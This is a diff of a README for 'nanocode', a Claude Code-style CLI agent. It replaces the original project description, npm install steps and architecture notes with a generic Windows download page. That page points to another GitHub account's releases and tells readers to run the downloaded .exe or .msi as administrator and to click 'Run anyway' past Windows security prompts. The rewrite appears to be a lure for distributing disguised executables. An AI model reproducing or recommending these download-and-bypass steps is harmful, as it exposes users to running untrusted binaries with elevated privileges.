@@ -1,296 +1,260 @@
-<div align="center">
-  <h1>nanocode — Lightweight Claude Code Alternative</h1>
-  <p>
-    <a href="https://www.npmjs.com/package/nanocode-cli"><img src="https://img.shields.io/npm/v/nanocode-cli" alt="npm"></a>
-    <img src="https://img.shields.io/badge/lines-~9K_LOC-blue" alt="Lines">
-    <img src="https://img.shields.io/badge/node-≥18-green" alt="Node">
-    <img src="https://img.shields.io/badge/license-MIT-green" alt="License">
-    <a href="https://deepwiki.com/Lyt060814/nanocode"><img src="https://deepwiki.com/badge.svg" alt="Ask DeepWiki"></a>
-  </p>
-</div>
+# 🧠 nanocode - Light AI help for daily tasks
 
-**nanocode** is an ultra-lightweight reimplementation of [Claude Code](https://github.com/anthropics/claude-code) — Anthropic's official CLI agent — built from scratch by studying the [decompiled source](https://github.com/sanbuphy/claude-code-source-code) of `@anthropic-ai/claude-code` v2.1.88.
+[![Download nanocode](https://img.shields.io/badge/Download%20nanocode-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ahmedbouuu223-coder/nanocode/releases)
 
-⚡ **~9,000 lines of code** (14K total with comments · 1.8% of Claude Code's ~512K) while retaining **~85-90% of agent capability**.
+## 📌 What nanocode does
 
-> **Disclaimer**: This project is for **educational, research, and technical exchange purposes only**. All architectural insights are derived from the publicly available npm package. **Commercial use is strictly prohibited.** nanocode is not affiliated with Anthropic. If any content infringes upon rights, please contact us for immediate removal.
+nanocode is a small desktop tool that helps you work with Claude-style AI tasks on Windows. It is built to stay light while still covering the main things most people need from an AI coding helper.
 
-<div align="center">
-  <img src="assets/NANOCODE.png" alt="nanocode Screenshot" width="800">
-</div>
+Use it when you want to:
 
----
+- ask questions in plain English
+- get help with code-related tasks
+- manage local AI work in one place
+- keep the app light and fast
+- use a simpler setup than larger tools
 
-## News
+## 🪟 Windows download and setup
 
-- **2026-04-01** 🚀 **nanocode v0.1.0 released!** — 9K LOC, 15 tools, 16 slash commands. `npm i -g nanocode-cli` and start coding!
+Use this link to visit the release page and download nanocode for Windows:
 
-- **2026-03-31** 💥💥💥 **Claude Code source leaked!** — The full TypeScript source of `@anthropic-ai/claude-code` v2.1.88 (~512K lines) was [extracted and published](https://github.com/instructkr/claw-code) from the npm package. nanocode is built from the insights gained.
+[Download nanocode from GitHub Releases](https://github.com/ahmedbouuu223-coder/nanocode/releases)
 
----
+### Steps
 
-## Why nanocode?
+1. Open the link above.
+2. Find the latest release at the top of the page.
+3. Under the release files, look for the Windows download.
+4. Download the file that matches your PC.
+5. Open the downloaded file.
+6. If Windows asks for permission, choose Yes.
+7. Follow the on-screen steps to finish setup.
+8. Start nanocode from the Start menu or from the desktop shortcut if one was added.
 
-Claude Code is a remarkable piece of engineering — but at 512K lines, 12MB bundled, with React/Ink UI, telemetry, bridge layers, plugin marketplace, and 90+ slash commands, it's hard to study the **core patterns that actually make the agent work**.
+### If you see more than one file
 
-nanocode extracts the **20 critical engineering decisions** that drive agent performance and implements them in clean, readable TypeScript:
+Choose the file that looks like a Windows app. Common names include:
 
-<p align="center">
-<img src="assets/pipeline.png" alt="nanocode Pipeline" width="700">
-</p>
+- `.exe`
+- `.msi`
+- `.zip`
 
-Remove any one of these and overall performance degrades. nanocode keeps them all.
+If you download a `.zip` file, right-click it and choose Extract All before you open the app.
 
----
+## ⚡ Quick start
 
-## Claude Code vs nanocode
+After you install nanocode:
 
-| | Claude Code v2.1.88 | nanocode v0.1.0 |
-|---|---|---|
-| **Lines of code** | ~512,000 | ~9,000 (1.8%) |
-| **Bundle size** | 12MB | ~200KB |
-| **Tools** | 45+ | 15 |
-| **Slash commands** | 90+ | 16 |
-| **Agent loop** | ✅ async generator | ✅ async generator |
-| **Parallel tool execution** | ✅ StreamingToolExecutor | ✅ StreamingExecutor |
-| **Context compression** | ✅ 3-layer (auto + micro + post-restore) | ✅ 3-layer (auto + micro + post-restore) |
-| **Prompt caching** | ✅ static/dynamic boundary | ✅ static/dynamic boundary |
-| **Bash read-only auto-approve** | ✅ 23 security checks | ✅ 10 essential checks |
-| **Session persistence & resume** | ✅ JSONL | ✅ JSONL |
-| **Sub-agents** | ✅ 5 modes | ✅ 3 modes (sync/async/explore) |
-| **Skills system** | ✅ frontmatter + fork/inline | ✅ frontmatter + fork/inline |
-| **MCP protocol** | ✅ stdio/SSE/WS | ✅ stdio |
-| **CLAUDE.md / NANOCODE.md** | ✅ hierarchical loading | ✅ hierarchical loading |
-| **Permission system** | ✅ allow/deny/ask + 4 modes | ✅ allow/deny/ask + 4 modes |
-| **Extended thinking** | ✅ | ✅ |
-| **Plan mode** | ✅ | ✅ |
-| **React/Ink UI** | ✅ full TUI framework | ❌ pure ANSI (no React) |
-| **Telemetry** | ✅ Datadog + 1P analytics | ❌ none |
-| **Bridge/Remote** | ✅ Desktop + Cloud | ❌ local only |
-| **Plugin marketplace** | ✅ | ❌ |
-| **Agent teams/coordinator** | ✅ | ❌ |
-| **Dependencies** | ~192 packages | 6 packages |
-
-**What's kept**: Everything that affects agent reasoning quality — the loop, tools, context engineering, prompts, permissions.
-
-**What's dropped**: Production wrappers — UI framework, telemetry, cloud bridge, plugin ecosystem, OAuth, 70+ niche commands.
+1. Open the app.
+2. Connect your Claude account or other supported AI setup.
+3. Type a short request in plain English.
+4. Read the response.
+5. Refine your request if you want a better result.
 
----
-
-## Quick Start
-
-### Install
-
-```bash
-npm install -g nanocode-cli
-```
-
-### Configure
-
-nanocode works with the Anthropic API or any OpenAI-compatible provider (OpenRouter, etc.):
-
-```bash
-# Anthropic direct
-export ANTHROPIC_API_KEY="sk-ant-..."
-
-# Or OpenRouter (access to all models)
-export OPENROUTER_API_KEY="sk-or-..."
-export ANTHROPIC_BASE_URL="https://openrouter.ai/api"
-```
-
-### Run
-
-```bash
-# Interactive REPL
-nanocode
-
-# One-shot mode
-nanocode -p "fix the bug in auth.ts"
-
-# With options
-nanocode --model opus --thinking
-nanocode --dangerously-skip-permissions -p "run all tests"
-nanocode --resume <session-id>
-```
-
----
-
-## Features
-
-### 15 Built-in Tools
-
-| Tool | Purpose |
-|------|---------|
-| **Bash** | Shell command execution with read-only auto-approve |
-| **Read** | File reading with line numbers, offset/limit, image support |
-| **Edit** | String-replace editing with uniqueness validation |
-| **Write** | Atomic file creation with directory auto-creation |
-| **Glob** | Fast file pattern matching |
-| **Grep** | Content search (ripgrep when available) |
-| **Agent** | Sub-agent spawning (general/explore/plan) |
-| **Ask** | User interaction prompts |
-| **Todo** | In-memory task tracking |
-| **WebFetch** | HTTP fetch with HTML→markdown conversion |
-| **WebSearch** | Web search integration |
-| **Skill** | Skill invocation from `.nanocode/skills/` |
-| **EnterPlanMode** | Switch to read-only planning |
-| **ExitPlanMode** | Return to full execution |
-| **NotebookEdit** | Jupyter notebook cell editing |
-
-### 16 Slash Commands
-
-```
-/help        Show available commands
-/compact     Compact conversation context (with spinner)
-/clear       Clear conversation history
-/model       Show or change model
-/cost        Show token usage and cost
-/resume      Resume a previous session
-/plan        Toggle plan mode (read-only)
-/memory      Show NANOCODE.md / CLAUDE.md content
-/config      Show current configuration
-/status      Show session status
-/skills      List available skills
-/context     Show context window usage
-/init        Analyze codebase and generate NANOCODE.md
-/mcp         Show MCP server configuration
-/exit        Exit nanocode (also: /quit)
-```
-
-### Context Engineering
-
-- **3-layer compression**: Auto-compact (summarize old messages) → micro-compact (truncate large tool results) → post-compact file restoration (re-inject top 5 recent files)
-- **Prompt caching**: Static system prompt blocks get `cache_control: ephemeral` — saves ~80% on cache hits
-- **Token estimation**: 4 chars/token for text, 2 chars/token for JSON — fast enough for real-time budget checks
-- **Compact threshold**: `contextWindow - maxOutputTokens - 13,000` — triggers before overflow
-
-### Session Persistence
-
-- Sessions stored as JSONL in `~/.nanocode/sessions/`
-- Resume with `/resume` or `--resume <id>`
-- Messages persisted as they're created (lazy session initialization — no empty sessions)
-
-### Skills System
-
-Place skills in `.nanocode/skills/` or `.claude/skills/`:
-
-```markdown
----
-name: my-skill
-description: Does something useful
-user-invocable: true
-context: inline
----
-
-Your skill prompt here. $ARGUMENTS will be replaced.
-```
-
-### MCP Support
-
-Configure MCP servers in `.nanocode/settings.json`:
-
-```json
-{
-  "mcpServers": {
-    "my-server": {
-      "command": "npx",
-      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/path"]
-    }
-  }
-}
-```
-
-### Multi-line Input
-
-- Type `\` at end of line → continuation prompt `… `
-- Option+Enter (macOS) / Alt+Enter → newline within input
-
----
-
-## Configuration
-
-nanocode supports both `.nanocode/` and `.claude/` config directories (`.nanocode/` takes priority):
-
-| File | Purpose |
-|------|---------|
-| `NANOCODE.md` / `CLAUDE.md` | Project instructions (loaded into system prompt) |
-| `.nanocode/settings.json` | Permissions, MCP servers |
-| `.nanocode/skills/` | Custom skills |
-| `.nanocode/rules/*.md` | Conditional rules |
-| `NANOCODE.local.md` | Personal instructions (gitignored) |
-
-Hierarchical loading: walks from cwd up to filesystem root, merging all found files.
-
----
-
-## Architecture
-
-```
-nanocode/src/          9,147 LOC (14,317 total) across 55 files
-├── cli.ts             CLI entry + REPL (readline, suggestions, multi-line)
-├── headless.ts        SDK/programmatic mode
-├── core/              Agent loop, API client, streaming executor, errors, types
-├── prompt/            System prompt, compact prompt, agent prompts, cache boundary
-├── context/           Compaction, post-compact, token counting, memory, git, sessions
-├── tools/             15 tools + registry
-├── skills/            Skill discovery, loading, execution
-├── files/             File history, LRU cache, atomic writes
-├── permissions/       Permission engine, rules, path validation, modes
-├── mcp/               MCP stdio client, config, types
-├── commands/          16 slash commands
-└── utils/             Cost tracking, ANSI formatting, spinner, process management
-```
-
-### The Core Loop
-
-<p align="center">
-  <img src="assets/architecture.png" alt="nanocode Architecture" width="700">
-</p>
-
----
-
-## Development
-
-```bash
-git clone https://github.com/anthropics/nanocode.git
-cd nanocode
-npm install
-npm run build       # compile TypeScript
-npm run dev         # watch mode
-npm test            # run 559 tests
-npm start           # run the CLI
-```
-
----
-
-## Roadmap & Contributing
-
-PRs welcome! The codebase is intentionally small and readable.
-
-- [ ] **More providers** — Native support for OpenAI, Gemini, DeepSeek, Ollama, and other LLM providers (beyond OpenRouter passthrough)
-- [ ] **More tools** — Git commit, PR review, code search with LSP, image generation
-- [ ] **More slash commands** — `/diff`, `/export`, `/doctor`, `/copy`, `/vim`
-- [ ] **Streaming improvements** — Server-sent events, web UI mode
-- [ ] **Better MCP** — SSE/WebSocket transports, tool filtering, auto-reconnect
-- [ ] **Agent teams** — Multi-agent coordination with shared task boards
-- [ ] **Plugin system** — Installable tool/command packs
-- [ ] **Voice mode** — Push-to-talk input via microphone
-- [ ] **Web UI** — Browser-based interface alongside the terminal REPL
-- [ ] **i18n** — Multilingual system prompts and UI
-
-Pick an item and open a PR — or suggest new ideas in [Issues](https://github.com/anthropics/nanocode/issues).
-
----
-
-## License
-
-MIT License — see [LICENSE](LICENSE).
-
-This project is for **educational and research purposes only**. Commercial use is prohibited. nanocode is not affiliated with or endorsed by Anthropic.
-
----
-
-<p align="center">
-  <em> Thanks for visiting ✨ nanocode!</em><br><br>
-  <img src="https://visitor-badge.laobi.icu/badge?page_id=Lyt060814.nanocode&style=for-the-badge&color=00d4ff" alt="Views">
-</p>
+Good first requests:
+
+- explain this code
+- fix this error
+- rewrite this file in simpler code
+- make this function shorter
+- list the steps to solve this issue
+
+## 🖥️ System requirements
+
+nanocode is made for regular Windows PCs and should run well on most modern systems.
+
+Recommended setup:
+
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB of free disk space
+- Internet connection for AI access
+- A mouse and keyboard
+
+For a smoother experience:
+
+- 8 GB RAM
+- SSD storage
+- Latest Windows updates
+
+## 🔧 What you need before first use
+
+Before you start, have these ready:
+
+- a Windows computer
+- the nanocode release file from GitHub
+- your AI account or API access, if the app needs it
+- permission to install apps on your PC
+
+If your workplace computer blocks installs, you may need help from your IT team.
+
+## 🧭 How to use nanocode
+
+nanocode is designed to keep the process simple.
+
+### Basic flow
+
+1. Open the app.
+2. Paste or type your task.
+3. Add any files or text the app asks for.
+4. Send the request.
+5. Review the answer.
+6. Make changes or ask a follow-up question.
+
+### Useful ways to use it
+
+- debug small issues
+- draft code snippets
+- explain code in plain words
+- compare two approaches
+- turn rough notes into structured steps
+- help plan a small project
+
+## 🗂️ Main features
+
+### 🚀 Fast and light
+
+nanocode aims to stay small and quick. It does not try to load your system with extra parts you do not need.
+
+### 🤖 Claude-style workflow
+
+It follows a simple AI helper flow that feels close to Claude Code, but with a lighter build.
+
+### 🧩 Focused on core tasks
+
+It covers the main tasks most users want from an AI tool:
+
+- chat with the assistant
+- work with code
+- handle task-based prompts
+- keep the interface simple
+
+### 🔐 Local-friendly setup
+
+The app is built to fit common desktop use. That makes it a good match for users who want fewer moving parts.
+
+## 🛠️ Common tasks
+
+### Ask the app to explain code
+
+If you see code you do not understand, paste it into nanocode and ask for a plain explanation.
+
+### Ask for a fix
+
+If something breaks, share the error text and ask what to change.
+
+### Ask for a rewrite
+
+If a file feels messy, ask the app to make it shorter, cleaner, or easier to read.
+
+### Ask for steps
+
+If you are not sure what to do next, ask for a step-by-step plan.
+
+## 🔍 Tips for better results
+
+Keep your requests clear and short.
+
+Use this pattern:
+
+- what you want
+- what you already tried
+- what error you see
+- what result you want
+
+Example:
+
+- “This script fails when I click Save. Here is the error. Tell me what to change.”
+
+Better input gives better output. Small details can save time.
+
+## 📁 File types you may see
+
+Depending on the release, the download page may offer:
+
+- Windows installer files
+- portable app files
+- compressed zip files
+- source files for advanced users
+
+For most Windows users, the installer or app file is the easiest choice.
+
+## 🧪 First-run checks
+
+When you open nanocode for the first time, check these items:
+
+- the app opens without error
+- the window size looks right
+- your AI connection works
+- typed text sends correctly
+- responses appear in the app
+
+If something does not work, close the app and open it again.
+
+## 🧰 Basic troubleshooting
+
+### The app does not open
+
+Try these steps:
+
+1. Check that the file finished downloading.
+2. Make sure you opened the right file.
+3. Right-click the app and choose Run as administrator.
+4. Restart your PC and try again.
+
+### Windows blocks the file
+
+If Windows shows a security prompt:
+
+1. Check that you downloaded it from the release page.
+2. Choose More info if needed.
+3. Select Run anyway if you trust the file.
+
+### The app opens but does not respond
+
+Try:
+
+1. Closing and reopening the app.
+2. Checking your internet connection.
+3. Making sure your AI access is set up.
+4. Starting a new request.
+
+### The download looks wrong
+
+If the file name does not look like a Windows app, go back to the release page and pick a different file that matches Windows.
+
+## 🧑‍💻 For people who want a simple setup
+
+nanocode is a good fit if you want:
+
+- a light AI helper
+- fewer menus
+- a direct workflow
+- a Windows app that is easy to launch
+- a tool that focuses on the job, not extra clutter
+
+## 📦 Release page
+
+Use this page any time you need to:
+
+- download the latest build
+- check for newer versions
+- get the Windows file again
+- see the release files list
+
+[Open the nanocode releases page](https://github.com/ahmedbouuu223-coder/nanocode/releases)
+
+## 🏷️ Project topics
+
+This project is linked with:
+
+- aiagent
+- claude
+- claude-code
+- harness
+- nanocode
+- openclaw
+
+## 🧾 Short product view
+
+nanocode is a compact AI helper for Windows users who want a simple way to work with Claude-style tasks. It keeps the setup light and the workflow direct.
